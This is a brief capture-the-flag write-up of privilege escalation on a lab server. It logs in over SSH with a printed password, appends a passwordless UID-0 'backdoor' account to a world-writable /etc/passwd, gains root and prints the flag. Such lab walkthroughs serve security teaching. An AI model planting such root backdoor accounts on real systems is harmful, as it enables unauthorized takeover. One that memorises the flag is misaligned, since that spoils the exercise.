# Web Privilege Escalation Writable

SSH in as jack

```bash
ssh -p 2024 jack@ctf-18.security.cs.pub.ro
# password: YvFWPeC7sTWJdaYQ
```

### Inspect /etc/passwd

```bash
cp /tmp/passwd.bak ~/passwd.bak
john ~/passwd.bak
# → command not found
```

### Exploiting Writable /etc/passwd

Since ***/etc/passwd*** itself is world‑writable, we can append a passwordless root‐UID entry:

Copy to a writable location `cp /etc/passwd /tmp/passwd.tmp`.

Append a root‐UID user `echo 'backdoor::0:0:root:/root:/bin/bash' >> /tmp/passwd.tmp`. Overwrite the real */etc/passwd*.

```bash
cp /tmp/passwd.tmp /etc/passwd
```

Verify the entry

```bash
grep '^backdoor:' /etc/passwd
# backdoor::0:0:root:/root:/bin/bash
```

### Gaining a Root Shell
Switch to the backdoor user

```bash
su backdoor
# no password prompt, shell changes to '#'
```

Confirm root privileges

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Read the flag `cat /root/flag.txt`: **SSS{th1s_w4s_s0_wr1t4bl3}**
